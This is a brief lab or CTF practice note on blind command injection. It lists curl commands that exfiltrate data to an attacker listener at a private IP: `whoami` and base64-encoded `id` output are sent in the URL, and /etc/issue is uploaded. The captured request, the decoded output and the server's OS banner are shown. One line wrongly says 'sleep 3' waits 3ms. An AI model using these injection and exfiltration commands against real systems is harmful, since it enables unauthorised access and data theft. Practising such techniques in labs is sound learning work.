# Command Injection Practice 

```
sleep 3 
```
waits 3ms 

```
curl http://10.6.17.96:5555
curl http://10.6.17.96:5555/`whoami` 
curl http://10.6.17.96:5555/`id | base64`  
```

```
GET /dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK HTTP/1.1
echo 'dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK' | base64 -d                            1 ⨯
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
```
curl http://10.6.17.96:5555/ -T /etc/issue
Ubuntu 18.04.4 LTS \n \l
 ```

 